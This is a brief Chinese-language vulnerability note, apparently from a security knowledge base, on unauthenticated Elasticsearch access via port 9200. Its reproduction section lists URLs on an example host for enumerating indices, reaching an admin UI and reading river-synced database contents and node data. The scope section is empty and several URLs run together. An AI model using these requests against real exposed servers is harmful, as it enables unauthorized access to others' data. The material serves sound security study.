Elasticsearch未授权访问
=======================

一、漏洞简介
------------

> ElasticSearch
> 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。

二、影响范围
------------

三、复现过程
------------

安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。

http://0-sec.org:9200/\_cat/indices
里面的indices包含了\_river一般就是安装了river了。http://0-sec.org:9200/\_plugin/head/ web管理界面http://0-sec.org:9200/\_cat/indiceshttp://0-sec.org:9200/\_river/\_search 查看数据库敏感信息http://0-sec.org:9200/\_nodes 查看节点数据
